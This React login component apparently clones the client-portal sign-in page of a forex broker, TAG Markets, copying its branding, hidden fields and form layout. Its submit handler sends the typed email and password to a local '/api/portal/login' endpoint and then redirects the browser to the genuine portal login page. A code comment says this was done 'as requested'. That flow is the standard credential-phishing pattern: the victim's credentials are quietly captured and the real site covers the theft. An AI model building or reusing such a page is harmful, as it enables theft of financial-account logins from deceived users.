"use client";

import { useState, type FormEvent, type HTMLAttributes } from "react";

import { PortalFooter } from "./PortalFooter";
import { PortalNav } from "./PortalNav";

export function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [pending, setPending] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (pending) return;

    setPending(true);
    setError(null);

    try {
      const response = await fetch("/api/portal/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password, remember }),
      });
      if (!response.ok) throw new Error("login failed");
      // After a successful sign-in, redirect to the live portal login page as requested.
      window.location.href = "https://portal.tagmarkets.com/login";
    } catch {
      setError("Unable to sign in right now. Please try again.");
      setPending(false);
    }
  }

  return (
    <>
      <div className="bg-theme-full-container">
        <div className="container">
          <PortalNav langBase="/login" />
          <div className="row margin-bottom-50">
            <div className="col-xs-12 col-sm-12 col-md-12 col-lg-12">
              <div className="syntellicore-login">
                <div className="login-container">
                  <div className="row">
                    <div className="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                      <div className="portlet padding-30 ">
                        <h2 />
                        <hr />
                        <div className="col-xs-12 col-sm-12 col-md-6 col-lg-6 col-no-padding ">
                          <div className="left-theme-container">
                            <div className="row margin-bottom-20">
                              <div className="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                                <span>
                                  Sections marked with{" "}
                                  <span className="text-primary span-primary-sign-up">*</span> are
                                  mandatory fields
                                </span>
                              </div>
                            </div>
                            <form
                              action="https://portal.tagmarkets.com/auth"
                              method="POST"
                              role="form"
                              id="loginForm"
                              target="_self"
                              onSubmit={handleSubmit}
                            >
                              <div className="form-group">
                                <label htmlFor="userEmail" className="contorl-label">
                                  <span>
                                    <span>Email or username: </span>
                                    <span>*</span>
                                  </span>
                                </label>
                                <input
                                  id="userEmail"
                                  className="form-control userEmail"
                                  name="userEmail"
                                  type="text"
                                  value={email}
                                  onChange={(event) => setEmail(event.target.value)}
                                  autoComplete="username"
                                />
                                <span className="help-block">
                                  {error ? <span className="text-danger">{error}</span> : null}
                                </span>
                              </div>
                              <div className="form-group">
                                <label htmlFor="userPassword" className="contorl-label">
                                  <span>
                                    <span>Password: </span>
                                    <span>*</span>
                                  </span>
                                </label>
                                <div className="input-group">
                                  <input
                                    id="userPassword"
                                    className="form-control userPassword"
                                    name="userPassword"
                                    type={showPassword ? "text" : "password"}
                                    value={password}
                                    onChange={(event) => setPassword(event.target.value)}
                                    autoComplete="current-password"
                                  />
                                  <div
                                    className="input-group-addon"
                                    onClick={() => setShowPassword((value) => !value)}
                                  >
                                    <i
                                      className={`fa ${showPassword ? "fa-eye" : "fa-eye-slash"}`}
                                      id="enable-show"
                                      aria-hidden="true"
                                    />
                                  </div>
                                </div>
                                <span className="help-block" />
                              </div>
                              <a href="https://portal.tagmarkets.com/ForgotPassword">Forgot Password?</a>
                              <div className="checkbox">
                                <label htmlFor="RememberMe">
                                  <input
                                    id="RememberMe"
                                    name="RememberMe"
                                    type="checkbox"
                                    checked={remember}
                                    onChange={(event) => setRemember(event.target.checked)}
                                  />
                                  Remember me?
                                </label>
                                <input name="RememberMe" type="hidden" defaultValue="false" />
                              </div>
                              <div className="text-center margin-bottom-20">
                                <button
                                  type="submit"
                                  id="login_btn"
                                  className="btn btn-theme-primary btn-loader"
                                  data-loading-text="<i class='far fa-circle-notch fa-spin'></i> Login"
                                  disabled={pending}
                                >
                                  Login
                                </button>
                                <p className="font-weight-bold font-size-sm text-primary text-center">
                                  Trading Forex &amp; CFDs is Risky
                                </p>
                              </div>
                              <input id="newLogin" name="newLogin" type="hidden" defaultValue="1" />
                              <input id="brd" name="brd" type="hidden" defaultValue="" />
                              <input
                                id="targetval"
                                name="targetval"
                                type="hidden"
                                defaultValue="_self"
                              />
                              <input id="uid" name="uid" type="hidden" defaultValue="" />
                              <input
                                id="http_referer"
                                name="http_referer"
                                type="hidden"
                                defaultValue=""
                              />
                              <input id="is_ms" name="is_ms" type="hidden" defaultValue="0" />
                            </form>
                          </div>
                          <div className="row">
                            <div className="external-registration-container margin-top-10" />
                          </div>
                        </div>
                        <div className="col-xs-12 col-sm-12 col-md-6 col-lg-6 text-center col-no-padding ">
                          <div className="right-theme-container">
                            <h3>Do not have an Account yet?</h3>
                            <br />
                            <a
                              className="btn btn-theme-secondary btn-signup"
                              href="/live_signup"
                              target="_self"
                            >
                              <span>Register Now</span>
                            </a>
                            <p className="font-weight-bold font-size-sm text-primary text-center">
                              Trading Forex &amp; CFDs is Risky
                            </p>
                          </div>
                        </div>
                        <br {...({ clear: "all" } as HTMLAttributes<HTMLBRElement>)} />
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <PortalFooter />
    </>
  );
}
